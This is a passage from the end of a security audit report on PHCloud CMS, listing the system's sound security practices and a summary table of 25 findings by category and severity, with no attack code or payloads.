| **Informational** | API-02: Login rate limit bypass | MEDIUM | Low (15 min) | Non-Cloudflare deployment hardening |
| **Informational** | INFRA-01/02: Config observations | INFO | N/A | Awareness only |

---

## What PHCloud CMS Gets Right

No audit is complete without acknowledging good security practices:

1. **100% parameterized SQL queries** — Zero instances of string interpolation in SQL across the entire codebase
2. **Proper session cookie attributes** — `httpOnly`, `secure`, `sameSite: Lax`, `path: /` on all session cookies
3. **Cryptographic randomness** — All tokens (sessions, preview tokens, salts) use `crypto.randomUUID()` or `crypto.getRandomValues()`
4. **Constant-time password comparison** — Manual XOR loop prevents timing attacks
5. **All admin routes authenticated** — Every `/admin/*` and `/api/admin/*` route validates session before processing
6. **Graceful error handling in plugin pipeline** — Broken plugins don't crash the application
7. **HTML escaping in most rendering contexts** — `esc()`, `escAttr()`, and `escXml()` are used consistently in HTML templates
8. **Input validation on image uploads** — MIME type allowlist, size limits
9. **Generic error messages** — Login and install errors don't reveal internal state
10. **Install wizard idempotency** — Schema migrations are safe to re-run, preventing partial-install lockouts

---

## Summary Statistics

| Category | Critical | High | Medium | Low | Info | Total |
|----------|----------|------|--------|-----|------|-------|
| Authentication | 0 | 1 | 1 | 2 | 0 | 4 |
| Authorization | 0 | 0 | 0 | 1 | 1 | 2 |
| Input Validation | 0 | 0 | 2 | 0 | 1 | 3 |
| XSS | 1 | 0 | 2 | 1 | 0 | 4 |
| CSRF | 0 | 0 | 1 | 0 | 0 | 1 |
| Security Headers | 0 | 1 | 0 | 0 | 0 | 1 |
| Data Protection | 0 | 0 | 0 | 2 | 0 | 2 |
| Image Handling | 0 | 0 | 1 | 1 | 0 | 2 |
| API Security | 0 | 1 | 1 | 0 | 0 | 2 |
| Plugin System | 0 | 0 | 0 | 1 | 1 | 2 |
| Infrastructure | 0 | 0 | 0 | 0 | 2 | 2 |
| **Total** | **1** | **3** | **8** | **8** | **5** | **25** |

*Note: XSS-01 is rated CRITICAL in multi-admin scenarios and MEDIUM in single-admin trust model, hence the discrepancy in the summary table (counted as CRITICAL for conservative assessment).*

---

*End of Security Audit*
